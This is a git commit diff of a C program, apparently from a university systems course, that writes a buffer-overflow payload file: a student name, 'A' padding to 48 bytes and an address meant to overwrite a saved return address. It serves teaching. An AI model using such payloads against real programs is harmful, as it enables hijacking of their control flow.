3e65f175e0dde565d2b13bcbba5b233745298136
matthewzhang <mz8189@princeton.edu>
2023-12-10 19:04:56 -0500

    me

--- createdataB.c
+++ createdataB.c
@@ -10,18 +10,32 @@
 /*--------------------------------------------------------------------*/
 
 #include <stdio.h>
-
+#include <string.h>
 /* Accepts a string of characters as a command-line argument. Writes
    the string of characters to the dataB file. Returns 0. */
 int main(void) {
-   
+   unsigned int uiData;
    FILE *dataB;
    
    dataB = fopen("dataB", "w+");
-   fprintf(dataB, "Alex Delistathis & Matthew Zhang"
-      );
-   fprintf(dataB, "angangangangang4196500");
-
-   return 0;
-}
    
+   if (dataB == NULL) {
+        perror("Error opening file");
+        return -1;
+   }
+
+    const char name[] = "Alex Delisthathis & Matthew Zhang";
+    fwrite(name, sizeof(char), strlen(name), dataB);
+
+    /* Adjust the size as needed with 48 byte buffer*/
+    const int paddingSize = 48 - strlen(name); 
+    for (int i = 0; i < paddingSize; i++) {
+        fputc('A', dataB); /* Writing padding character 'A'*/
+    }
+
+    /*Address to overwrite return address with in little-endian format*/
+    unsigned int address = 0x4196500; /*Replace with the correct address*/
+    fwrite(&address, sizeof(unsigned int), 1, dataB);
+    fclose(dataB);
+    return 0;
+}
